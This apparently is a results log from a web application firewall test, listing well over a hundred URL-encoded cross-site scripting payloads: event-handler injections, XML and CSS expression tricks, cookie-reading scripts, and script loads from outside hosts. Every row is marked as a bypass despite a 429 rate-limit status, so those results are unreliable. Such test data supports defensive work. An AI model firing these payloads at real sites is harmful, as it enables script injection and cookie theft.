test_name,url,method,status_code,is_blocked,bypassed
xss,/?p=%3Cwbr%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onclick%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onbeforepaste%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onclick%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeydown%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncontextmenu%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncopy%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncontextmenu%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncut%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncut%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20oncopy%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20ondblclick%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20ondblclick%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeydown%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20ondblclick%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousedown%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C/wbr%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onfocusout%3Dprompt%281%29%20tabindex%3D1%20id%3Dx%3E%3C/wbr%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onfocusout%3Dconfirm%281%29%20tabindex%3D1%20id%3Dx%3E%3C/wbr%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeypress%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeypress%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeyup%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onkeyup%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseenter%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseenter%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseenter%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousedown%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousedown%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseleave%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseleave%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseleave%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousemove%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousemove%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousemove%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmousemove%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseover%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseout%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseout%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseout%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseover%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseover%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseup%3D%22alert%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseup%3D%22confirm%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onmouseup%3D%22prompt%281%29%22%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cw%20contenteditable%20id%3Dx%20onfocus%3Dconfirm%28%29%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onpaste%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cw%20contenteditable%20id%3Dx%20onfocus%3Dalert%28%29%3E,GET,429,false,true
xss,/?p=%3Cwbr%20onpaste%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/wbr%3E,GET,429,false,true
xss,/?p=%3Cw%20contenteditable%20id%3Dx%20onfocus%3Dprompt%28%29%3E,GET,429,false,true
xss,/?p=width%3A%20expression%28%28window.r%3D%3Ddocument.cookie%29%3F%27%27%3Aalert%28r%3Ddocument.cookie%29%29,GET,429,false,true
xss,/?p=width%3A%20expression%28%28window.r%3D%3Ddocument.cookie%29%3F%27%27%3Aconfirm%28r%3Ddocument.cookie%29%29,GET,429,false,true
xss,/?p=width%3A%20expression%28%28window.r%3D%3Ddocument.cookie%29%3F%27%27%3Aprompt%28r%3Ddocument.cookie%29%29,GET,429,false,true
xss,/?p=window%5Bdocument.body.innerText.charAt%28document.body.innerText.indexOf%28%27a%27%29%29%2B%27lert%27%5D%281%29,GET,429,false,true
xss,/?p=%22%3E/XaDoS/%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%20src%3D%22http%3A//www.site.com/XSS.js%22%3E%3C/script%3E,GET,429,false,true
xss,/?p=%22%3E/XaDoS/%3E%3Cscript%3Eprompt%28document.cookie%29%3C/script%3E%3Cscript%20src%3D%22http%3A//www.site.com/XSS.js%22%3E%3C/script%3E,GET,429,false,true
xss,/?p=%22%3E/XaDoS/%3E%3Cscript%3Econfirm%28document.cookie%29%3C/script%3E%3Cscript%20src%3D%22http%3A//www.site.com/XSS.js%22%3E%3C/script%3E,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onblur%3Dconfirm%281%29%3Elose%20focus%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onblur%3Dalert%281%29%3Elose%20focus%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onblur%3Dprompt%281%29%3Elose%20focus%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onfocus%3Dconfirm%281%29%3Efocus%20this%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onfocus%3Dprompt%281%29%3Efocus%20this%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onfocus%3Dalert%281%29%3Efocus%20this%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20oninput%3Dalert%281%29%3Einput%20here%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20oninput%3Dprompt%281%29%3Einput%20here%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeydown%3Dalert%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeydown%3Dconfirm%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20oninput%3Dconfirm%281%29%3Einput%20here%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeydown%3Dprompt%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeypress%3Dalert%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeypress%3Dconfirm%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeypress%3Dprompt%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeyup%3Dalert%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeyup%3Dconfirm%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onkeyup%3Dprompt%281%29%3Epress%20any%20key%21,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onpaste%3Dalert%281%29%3Epaste%20here%21,GET,429,false,true
xss,/?p=%3Cx%20%27%3D%22foo%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%27%3E,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onpaste%3Dprompt%281%29%3Epaste%20here%21,GET,429,false,true
xss,/?p=%3Cx%20%27%3D%22foo%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aconfirm%281%29//%27%3E,GET,429,false,true
xss,/?p=%3Cx%20contenteditable%20onpaste%3Dconfirm%281%29%3Epaste%20here%21,GET,429,false,true
xss,/?p=%3Cx%20%27%3D%22foo%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aprompt%281%29//%27%3E,GET,429,false,true
xss,/?p=xlink%3Ahref%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3ECLICKME%3C/maction%3E%20%3C/math%3E,GET,429,false,true
xss,/?p=XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A//xssme.html5sec.org/xssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28,GET,429,false,true
xss,/?p=%3Cxml%20id%3Di%3E%3Cx%3E%3Cc%3E%3C%21%5Bcdata%5B%3Cimg%20src%3D%22javas%5D%5D%3E%3C%21%5Bcdata%5Bcript%3Aalert%28%27xss%27%29%3B%22%3E%5D%5D%3E%3C/c%3E%3C/x%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aconfirm%28%27XSS%27%29%3B%22%3E%5D%5D%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5BCDATA%5Bcript%3Ajavascript%3Aalert%281%29%3B%22%3E%5D%5D%3C/C%3E%3CX%3E%3C/xml%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5BCDATA%5Bcript%3Ajavascript%3Aconfirm%281%29%3B%22%3E%5D%5D%3C/C%3E%3CX%3E%3C/xml%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5BCDATA%5Bcript%3Ajavascript%3Aprompt%281%29%3B%22%3E%5D%5D%3C/C%3E%3CX%3E%3C/xml%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3Di%3E%3Cx%3E%3Cc%3E%3C%21%5Bcdata%5B%3Cimg%20src%3D%22javas%5D%5D%3E%3C%21%5Bcdata%5Bcript%3Aconfirm%28%27xss%27%29%3B%22%3E%5D%5D%3E%3C/c%3E%3C/x%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aprompt%28%27XSS%27%29%3B%22%3E%5D%5D%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3Di%3E%3Cx%3E%3Cc%3E%3C%21%5Bcdata%5B%3Cimg%20src%3D%22javas%5D%5D%3E%3C%21%5Bcdata%5Bcript%3Aprompt%28%27xss%27%29%3B%22%3E%5D%5D%3E%3C/c%3E%3C/x%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5Bcript%3Adocument.vulnerable%3Dtrue%3B%22%3E%5D%5D%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3D%22X%22%3E%3Ca%3E%3Cb%3E%3Cscript%3Edocument.vulnerable%3Dtrue%3B%3C/script%3E%3B%3C/b%3E%3C/a%3E%3C/xml%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3D%22xss%22%3E%3Ci%3E%3Cb%3E%3Cimg%20src%3D%22javas%3C%21--%20--%3Ecript%3Aalert%28%27xss%27%29%22%3E%3C/b%3E%3C/i%3E%3C/xml%3E%3Cspan%20datasrc%3D%22%23xss%22%20datafld%3D%22b%22%20dataformatas%3D%22html%22%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3D%22xss%22%3E%3Ci%3E%3Cb%3E%3Cimg%20src%3D%22javas%3C%21--%20--%3Ecript%3Aconfirm%28%27xss%27%29%22%3E%3C/b%3E%3C/i%3E%3C/xml%3E%3Cspan%20datasrc%3D%22%23xss%22%20datafld%3D%22b%22%20dataformatas%3D%22html%22%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG%20SRC%3D%22javas%3C%21--%20--%3Ecript%3Aconfirm%28%27XSS%27%29%22%3E%3C/B%3E%3C/I%3E%3C/XML%3E,GET,429,false,true
xss,/?p=%3Cxml%20id%3D%22xss%22%3E%3Ci%3E%3Cb%3E%3Cimg%20src%3D%22javas%3C%21--%20--%3Ecript%3Aprompt%28%27xss%27%29%22%3E%3C/b%3E%3C/i%3E%3C/xml%3E%3Cspan%20datasrc%3D%22%23xss%22%20datafld%3D%22b%22%20dataformatas%3D%22html%22%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG%20SRC%3D%22javas%3C%21--%20--%3Ecript%3Aprompt%28%27XSS%27%29%22%3E%3C/B%3E%3C/I%3E%3C/XML%3E,GET,429,false,true
xss,/?p=%3CXML%20ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG%20SRC%3D%22javas%3C%21--%20--%3Ecript%3Adocument.vulnerable%3Dtrue%22%3E%3C/B%3E%3C/I%3E%3C/XML%3E%3CSPAN%20DATASRC%3D%22%23xss%22%20DATAFLD%3D%22B%22%20DATAFORMATAS%3D%22HTML%22%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3Cxml%20onPropertyChange%20xml%20onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/xml%20onPropertyChange%3E,GET,429,false,true
xss,/?p=%3Cxml%20onPropertyChange%20xml%20onPropertyChange%3D%22javascript%3Ajavascript%3Aconfirm%281%29%22%3E%3C/xml%20onPropertyChange%3E,GET,429,false,true
xss,/?p=%3Cxml%20onPropertyChange%20xml%20onPropertyChange%3D%22javascript%3Ajavascript%3Aprompt%281%29%22%3E%3C/xml%20onPropertyChange%3E,GET,429,false,true
xss,/?p=%3Cxml%20src%3D%22httP%3A//ha.ckers.org/xsstest.xml%22%20id%3Di%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E%3C/span%3E,GET,429,false,true
xss,/?p=%3CXML%20SRC%3D%22http%3A//ha.ckers.org/xsstest.xml%22%20ID%3DI%3E%3C/XML%3E,GET,429,false,true
xss,/?p=%3Cxml%20src%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27gotcha%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Econfirm%28%27gotcha%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Eprompt%28%27gotcha%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27httP%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Ealert%28document.cookie%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27httP%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Econfirm%28document.cookie%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27http%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Ejavascript%3Aalert%281%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27http%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Ejavascript%3Aconfirm%281%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27http%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Ejavascript%3Aprompt%281%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Chtml%3Ahtml%20xmlns%3Ahtml%3D%27httP%3A//www.w3.org/1999/xhtml%27%3E%3Chtml%3Ascript%3Eprompt%28document.cookie%29%3B%3C/html%3Ascript%3E%3C/html%3Ahtml%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondrag%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragend%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondrag%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragend%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragenter%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragenter%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragleave%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragstart%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragleave%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondrag%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onactivate%3Dprompt%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onactivate%3Dconfirm%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20draggable%3D%22true%22%20ondragstart%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dconfirm%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dprompt%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dconfirm%281%29%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dprompt%281%29%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dconfirm%281%29%3E%3C/xmp%3E%3Cinput%20id%3Dy%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dprompt%281%29%3E%3C/xmp%3E%3Cinput%20id%3Dy%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C/xmp%3E%3Cinput%20id%3Dy%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocus%3Dconfirm%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocus%3Dprompt%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocusin%3Dconfirm%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20id%3Dx%20tabindex%3D1%20onfocusin%3Dprompt%281%29%3E%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforecopy%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforecopy%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforecut%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
